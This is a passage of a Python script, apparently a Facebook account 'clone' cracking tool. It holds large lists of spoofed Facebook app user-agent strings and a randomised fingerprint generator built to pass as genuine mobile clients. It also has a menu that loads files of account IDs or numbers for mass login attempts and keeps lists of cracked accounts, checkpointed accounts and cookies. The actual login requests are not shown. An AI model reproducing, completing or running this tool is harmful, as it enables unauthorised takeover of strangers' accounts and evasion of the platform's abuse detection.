AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    __IPX__ = str(__IPN__)+' '+str(__UAX__)
    __IPD__ = str(__IPN__)+' '+str(__DXX__)
    return __M1X__

def ___UAH___():
    face_choice = random.choice(["fb_ver_type1","fb_ver_type2","fb_ver_type3","fb_ver_type4","fb_ver_type5","fb_ver_type6","fb_ver_type7","fb_ver_type8"])
    if face_choice == "fb_ver_type1":culkani = f"{str(random.randint(10,100))}.0.0.{str(random.randint(4000,5000))}"
    if face_choice == "fb_ver_type2":culkani = f"{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))}"
    if face_choice == "fb_ver_type3":culkani = f"{str(random.randint(10,100))}.0.0.{str(random.randint(1,8))}.{str(random.randint(40,150))}"
    if face_choice == "fb_ver_type4":culkani = f"{str(random.randint(10,432))}.0.0.{str(random.randint(11,99))}.{str(random.randint(1,200))}"
    if face_choice == "fb_ver_type5":culkani = f"{str(random.randint(191,505))}.{str(random.randint(0, 0))}.{str(random.randint(0, 0))}.{str(random.randint(39,69))}.{str(random.randint(64,154))}"
    if face_choice == "fb_ver_type6":culkani = f"{str(random.randint(100,450))}.{str(random.randint(0,0))}.{str(random.randint(0,0))}.{str(random.randint(1,40))}.{str(random.randint(10,150))}"
    if face_choice == "fb_ver_type7":culkani = f"{str(random.randint(11,77))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if face_choice == "fb_ver_type8":culkani = f"{str(random.randint(111,555))}.0.0.{str(random.randrange(9,49))}{str(random.randint(11,77))}"
    if face_choice == "fb_ver_type1":haga_result = str(random.randint(4000000,5000000))
    if face_choice == "fb_ver_type2":haga_result = str(random.randint(1111111,9999999))
    if face_choice == "fb_ver_type3":haga_result = str(random.randint(4100000,4999999))
    if face_choice == "fb_ver_type4":haga_result = str(random.randint(90000000,99999999))
    if face_choice == "fb_ver_type5":haga_result = str(random.randint(111111111,999999999))
    if face_choice == "fb_ver_type6":haga_result = str(random.randint(10000000,66666666))
    if face_choice == "fb_ver_type7":haga_result = str(random.randint(1111111,9999999))
    if face_choice == "fb_ver_type8":haga_result = str(random.randint(1111111,7777777))
    fbrv = random.choice([f"{str(random.randint(000000000,999999999))}","0"])
    mzs = random.choice([f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}",f"{random.randint(9, 16)}"])
    chrome_version = f"{random.randint(90, 114)}.0.{random.randint(0, 9999)}.{random.randint(0, 99)}"
    density = random.choice(["1.0", "1.25",  "1.2506", "1.278", "1.5", "1.625", "1.75", "1.8", "1.875", "2.0", "2.125", "2.2", "2.25", "2.375", "2.5", "2.75", "2.8", "2.9", "2.29375", "3.0", "3.25", "3.5", "3.75", "3.8", "4.0"])
    width = random.choice(["420","720","732","800","1080","1280","1440","1612","1920","2130","2131","2160","2400","2340","2392","2560","2640","3200"])
    height = random.choice(["420","720","732","800","1080","1280","1440","1612","1920","2130","2131","2160","2400","2340","2392","2560","2640","3200"])
    buildx = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
    ver = f"{random.randint(4,16)}.{random.randint(0,9)}.{random.randint(0,9)}"
    manufacturer = random.choice(manufacturers)
    model = random.choice(models[manufacturer])
    fb3=random.choice(["com.facebook.katana|FB4A","com.facebook.katana|Katana-Android","com.facebook.orca|Orca-Android","com.facebook.orca|messenger-android","com.facebook.mlite|MessengerLite","com.facebook.lite|FBLite","com.oculus.twilight|OculusTwilightAndroid","com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.stella|StellaForAndroid"])
    network_type = random.choice(["LTE","5G","HSPA","WiFi","Nepal_Telecom","MTS","AREEBA","Boost Mobile","TELCEL","DIALOG","KOREK","Movistar","Telia","Orange","Claro AR","Djezzy","MTML","MetroPCS","TIGO","T-Mobile","VodafoneAL","ENTEL","Oi","Mobitel LK","I WIND","NL KPN","S COMVIQ","vodafone P","MEO","NOS","altice MEO","GLOBE","TM","BASE | Lycamobile","EE","O2 - UK","Vodafone RO","Virgin","Sprint","AT&amp-T","HT HR","null","Telenor", "Fido" "MOVO AFRICA", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Skitto", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange", "Verizon", "AT&T", "T-Mobile", "Telefonica", "EE", "Three", "U.S. Cellular", "Verizon Wireless", "Cricket", "Google Fi", "Sprint", "Metro by T-Mobile", "Boost Mobile", "TracFone Wireless", "Xfinity Mobile", "Mint Mobile", "Visible", "Republic Wireless", "Consumer Cellular", "Straight Talk", "Spectrum Mobile", "Ting", "H2O Wireless", "FreedomPop", "Boost Infinite", "Simple Mobile", "Pure Talk", "C-Spire Wireless", "SouthernLINC Wireless", "GCI Wireless", "Bluegrass Cellular", "Nex-Tech Wireless", "T-Mobile Prepaid", "Ultra Mobile", "TracFone", "Freedom Wireless", "MetroPCS", "Cellcom", "Nextel", "Cricket Wireless"])
    fban3=fb3.split('|')[1]
    fbpn3=fb3.split('|')[0]
    language_code = random.choice(["en_US","en_GB","es_ES","fr_FR","de_DE","it_IT","pt_PT","ru_RU","zh_CN","ja_JP","ko_KR","ar_AR","en_AU","en_CA","en_IN","es_LA","fr_CA","th_TH","tr_TR","pl_PL","nl_NL","da_DK","fi_FI","sv_SE","nb_NO","cs_CZ","hu_HU","el_GR","ro_RO","sk_SK","bg_BG","uk_UA","hr_HR","lt_LT","lv_LV","et_EE","sr_RS","sl_SI","he_IL","hi_IN","ms_MY","id_ID","vi_VN","tl_PH","bn_IN","pa_IN","gu_IN","ta_IN","te_IN","ml_IN","kn_IN","mr_IN","or_IN","as_IN","ne_NP","si_LK","my_MM","km_KH","lo_LA","mn_MN","kmr_TR","ku_TR","bs_BA","sq_AL","mk_MK","mt_MT","cy_GB","gd_GB","ga_IE","eu_ES","gl_ES","ca_ES","ast_ES","oc_FR","br_FR","co_FR","rm_CH","wa_BE","lb_LU","mo_MD","be_BY","uz_UZ","tk_TM","kk_KZ","ky_KG","tg_TJ","az_AZ","hy_AM","ka_GE","af_ZA","xh_ZA","zu_ZA","sw_KE","am_ET","ti_ET","so_SO","om_ET","rn_BI","rw_RW","mg_MG","ha_NG","ig_NG","yo_NG","qu_PE","ay_PE","gn_PY","dz_BT","bo_CN","ug_CN","wo_SN","yo_BJ","ar_DZ","ar_EG","ar_IQ","ar_JO","ar_KW","ar_LB","ar_LY","ar_MA","ar_OM","ar_QA","ar_SA","ar_SD","ar_SY","ar_TN","ar_AE","ar_YE","fa_IR","ps_AF","ur_PK","sd_PK","pa_PK","si_LK","bn_BD","ta_LK","ta_MY","ta_SG","zh_HK","zh_MO","zh_SG","zh_TW","my_MM","ms_BN","ms_SG","th_TH","lo_LA","km_KH","vi_VN","id_ID","jv_ID","su_ID","tl_PH","fil_PH","ceb_PH","war_PH","en_BZ","es_MX","es_GT","es_CR","es_PA","es_DO","es_VE","es_CO","es_PE","es_EC","es_CL","es_AR","es_UY","es_PY","es_BO","es_HN","es_NI","es_PR","fr_BE","fr_CH","fr_LU","fr_MC","de_AT","de_CH","de_LU","de_LI","it_CH","nl_BE","fi_AX","se_SE","is_IS","fo_FO","kl_GL","en_NZ","en_ZA","en_JM","en_BW","en_NA","en_ZM","en_MW","en_UG","en_KE","en_TZ"])
    fbop=random.choice(["1","19","20","null"])
    vers = random.choice(["1.0","2.0","3.0","4.0","4.5","5.0"])
    hardware = random.choice(["armeabi-v7a","arm64-v8a","x86","x86_64","mips:mips64:","arm64-v8a:null","arm64-v8a:","armeabi-v7a:armeabi","arm64-v8a:armeabi-v7a:armeabi","x86:armeabi-v7a","x86_64:armeabi-v7a","x86:arm64-v8a:armeabi-v7a","x86_64:arm64-v8a:armeabi-v7a","x86_64:x86:armeabi-v7a","x86_64:x86:arm64-v8a"])
    __UAX__ = random.choice([f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FB_FW/2;FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBCA/{hardware};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};] FBBK/1",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1",f"[FBAN/{fban3};FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/EMA;FBBV/{haga_result};FBAV/{culkani};FBDV/{model};FBSV/{ver};FBCX/notifications_push_client_sync_graphql;FBDM/{{density={density}}}]",f"[FBAN/PAAA;FBAV/{culkani};FBDM/density={density},width={width},height={height};FBLC/{language_code};FBBV/{haga_result};FB_FW/2;FBSN/Android;FBDI/"+str(uuid.uuid4())+f";FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBSV/{ver};FBCA/{hardware};]:;]"])
    __DXX__ = random.choice([f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBRV/{fbrv};FB_FW/2;FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBOP/{fbop};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBBV/{haga_result};FBDM/{{density={density},width={width},height={height}}};FBLC/{language_code};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBPN/{fbpn3};FBDV/{model};FBSV/{ver};FBCA/{hardware};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/{fbrv};] FBBK/1",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1",f"[FBAN/FB4A;FBAV/{culkani};FBPN/{fbpn3};FBLC/{language_code};FBBV/{haga_result};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{ver};FBCA/{hardware};FBDM/{{density={density},width={width},height={height}}};]"])
    __IPN__ = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    __IPD__ = str(__IPN__)+' '+str(__DXX__)
    __IPX__ = str(__IPN__)+' '+str(__UAX__)
    ___FUCX___ = f"Mozilla/{vers} (Linux; Android {mzs}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36"
    ___FUXX___ = f"Mozilla/{vers} (Linux; Android {mzs}; {model} Build/{buildx}) {__UAX__}"
    ___FUXD___ = f"Mozilla/{vers} (Linux; Android {mzs}; {model} Build/{buildx}) {__DXX__}"
    return ___FUCX___

logo = f"""
  {C}╭──────────────────────────────╮
  │      {W}WELCOME TO USER{C}         │
  │  {G}EDITOR   {W}>{Y}> {G}IMRAN{C}           │
  │  {G}TOOLS   {W}>{Y}> {G}FILE CLONE{C}       │
  │  {G}VERSION {W}>{Y}> {P}0.2{C}              │
  ╰──────────────────────────────╯{W}"""

class ___cloud___:
	def __init__(self) -> None:
		self.loop=0
		self.oks=[]
		self.cps=[]
		self.lks=[]
		self.twf=[]
		self.gen=[]
		self.cokiex=[]
		self.cp2f=[]

	def menu(self) -> None:
		clear()
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{W}[{R}1{W}]>{Y}> {G}FILE CLONE              {C}│")
		print(f"  {C}├{W}[{R}2{W}]>{Y}> {G}NUMBER CLONE            {C}│")
		print(f"  {C}├{W}[{R}0{W}]>{Y}> {G}EXIT TOOLS              {C}│")
		print(f"  {C}└──────────────────────────────┘")
		print(f"  {C}│")
		joyy=input(f"  {C}└─✈ {G}INPUT MENU {W}<{Y}>{G} ")
		if joyy == "1":
			self.filex()
		if joyy == "2" :
			self.numberx()
		if joyy == "0":
			line()
			sys.exit()
		else:
			line()
			print("[✗] Option Not Found")
			sleep(2)
			self.menu()

	def filex(self) -> None:
		clear()
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{G}EXAMPLE {W}<{Y}>{G} /sdcard/test.txt   {C}│")
		print(f"  {C}└──────────────────────────────┘")
		hasina=input(f"  {C}└─✈ {G}INPUT FILE {W}<{Y}>{G} ")
		try:
			ids=open(hasina,'r').read().splitlines()
		except FileNotFoundError:
			line()
			print("[✗] File Not Found")
			sleep(2)
			self.filex()
		print(f"  {C}┌──────────────────────────────┐")
		print(f"  {C}├{W}[{R}1{W}]>{Y}> {G}GRAPH M-1              {C}│")
		print(f"  {C}├{W}[{R}2{W}]>{Y}> {G}B-GRAPH M-2              {C}│")
		print(f"  {C}├{W}[{R}3{W}]>{Y}> {G}API M-3              {C}│")
		print(f"  {C}├{W}[{R}4{W}]>{Y}> {G}B-API M-4              {C}│")
		print(f"  {C}├{W}[{R}5{W}]>{Y}> {G}GRAPH M-5              {C}│")
		print(f"  {C}└──────────────────────────────┘")
		mts=input(f"  {C}└─✈ {G}INPUT METHOD {W}<{Y}>{G} ")
		clear()
		print(f"  {C}┌──────────────────────────────┐")
